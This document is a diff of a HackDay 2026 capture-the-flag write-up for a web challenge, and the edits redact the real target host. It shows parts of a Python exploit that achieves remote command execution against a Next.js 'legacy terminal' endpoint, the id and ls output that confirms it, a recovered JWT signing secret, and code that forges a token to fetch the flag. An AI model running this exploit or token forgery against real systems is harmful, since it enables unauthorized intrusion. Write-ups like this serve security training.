@@ -6,11 +6,9 @@ tags:
 
 # Trust me I'm authenticated — HackDay 2026
 
-**Category:** Web
 
 ## Background
 
-- Target: `https://fhjhtr10n9.hackday.fr`
 - `/flag` gated by HTTP 401, `/terminal` hosted a Next.js “legacy terminal” and nginx/proxying a Go API that returned 404 on port 80.
 - Source comment “Last update: 2002” hinted at older auth mechanisms.
 
@@ -30,7 +28,7 @@ import requests, sys, urllib3
 urllib3.disable_warnings()
 
 cmd = sys.argv[1] if len(sys.argv) > 1 else "echo $((41*271))"
-url = "https://fhjhtr10n9.hackday.fr/terminal"
+url = "https://challenge.example/terminal"
 boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
 
 prefix_payload = (
@@ -64,16 +62,16 @@ resp = requests.post(url, headers=headers, data=payload.encode(), verify=False, 
 print(resp.status_code, resp.headers.get("X-Action-Redirect"))
 ```
 
-- Running the script with simple commands confirmed RCE as the `app` user inside `/app`:
-  - `python test_rce.py "whoami"` → `X-Action-Redirect: /login?a=app;push`
-  - `python test_rce.py "pwd"` → `/login?a=/app;push`
-  - `python test_rce.py "id"` → `/login?a=uid=100(app) gid=101(app) groups=101(app);push`
+- Running the exploit with simple commands confirmed RCE as the `app` user inside `/app`:
+  - `whoami` → `X-Action-Redirect: /login?a=app;push`
+  - `pwd` → `/login?a=/app;push`
+  - `id` → `/login?a=uid=100(app) gid=101(app) groups=101(app);push`
 
 ## Taming output noise
 
 - Multi-line output (e.g., `ls -la`) caused the redirect header to break and return 500/502. Wrapping commands in `echo $(...)` collapsed whitespace and made the header friendly again:
-  - `python test_rce.py 'echo $(ls)'` → redirected with the root `/app` listing.
-  - `python test_rce.py 'echo $(ls /)'` → returned the top-level directories.
+  - `echo $(ls)` → redirected with the root `/app` listing.
+  - `echo $(ls /)` → returned the top-level directories.
 
 ## Finding secrets
 
@@ -93,7 +91,7 @@ urllib3.disable_warnings()
 
 secret = "eZgZQxUmZr9A8HZFPLVjXKh3tWnZBWtF9GAtgmqLdNc="
 token = jwt.encode({}, secret, algorithm="HS256")
-resp = requests.get("https://fhjhtr10n9.hackday.fr/flag", headers={"Authorization": f"Bearer {token}"}, verify=False)
+resp = requests.get("https://challenge.example/flag", headers={"Authorization": f"Bearer {token}"}, verify=False)
 print(resp.status_code)
 print(resp.text.splitlines()[1])
 ```
